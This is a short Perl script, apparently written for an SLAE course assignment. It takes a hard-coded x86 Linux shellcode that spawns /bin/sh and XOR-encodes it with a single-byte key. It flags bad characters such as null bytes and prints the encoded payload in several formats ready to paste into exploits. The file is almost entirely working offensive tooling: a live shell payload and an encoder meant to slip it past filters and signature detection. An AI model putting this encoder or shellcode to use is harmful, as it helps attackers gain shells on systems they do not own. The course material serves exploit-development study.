#Author: John Stigerwalt
#Program Function: Takes shellcode and encodes with XOR (See secret variable to change encoding value)
#SLAE Assignment #4
#

$code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

#Set Value and convert to Hex using unpack
$secret = "\xaa";
$secrethex = unpack("H*", $secret);
$secretlength = length($secret);
print "\n"."---------------------------------"."\n";
print "Secret Hex Code Key: 0x" . $secrethex . "\n";
print "Orginal Secret Key Length: " . $secretlength . "\n";

# use hex of $code
$hexcode = unpack("H*",$code);
$hexlen = length($code);

print "[+] Hex code: ".$hexcode."\n";
print "Hex Length: ".$hexlen."\n";
print "---------------------------------"."\n";

for ($x=0;$x<$hexlen;$x++)
{
	$encoded = unpack("H*",substr($code,$x,1));
	$hexprint = $hexprint . ',0x' . $encoded;
	#Check for Nulls
	# Bad Chars: \x00\xbb\x61\xa0\xc6
	if ($encoded eq "00") {
		warn "Shellcode contains: \"0x00\" ";
	}
	if ($encoded eq "bb") {
		warn "Shellcode contains: \"0xbb\" ";
	}
}


# XOR encode
for ($i=0;$i<$hexlen;$i++) {
	
	$encoded = unpack("H*", substr($code,$i,1)^$secret);
	$hexxor = $hexxor . ',0x' . $encoded;
	$hexor=$hexor.$encoded;
	$hex_opt = $hex_opt . '\x' . $encoded; 
	if ($encoded eq "00") {
		warn "Shellcode contains: \"0x00\" ";
	}
	if ($encoded eq "bb") {
		warn "Shellcode contains: \"0xbb\" ";
	}
	if ($encoded eq "61") {
		warn "Shellcode contains: \"0x61\" ";
	}
	if ($encoded eq "a0") {
		warn "Shellcode contains: \"0xa0\" ";
	}
	if ($encoded eq "c6") {
		warn "Shellcode contains: \"0xc6\" ";
	}

}

print "\n"."---------------------------------"."\n";
print "Orginal Shellcode '0x' Format\n";
print "---------------------------------"."\n";
print $hexprint."\n\n";

print "---------------------------------"."\n";
print "XOR Shellcode RAW \n";
print "---------------------------------"."\n";
print $hexor."\n\n";

print "---------------------------------"."\n";
print "XOR Shellcode '0x' Format \n";
print "---------------------------------"."\n";
print $hexxor."\n\n";

print "---------------------------------"."\n";
print "XOR Shellcode '\\x' Format \n";
print "---------------------------------"."\n";
print "\"" . $hex_opt."\"" . "\n\n";

exit(1);
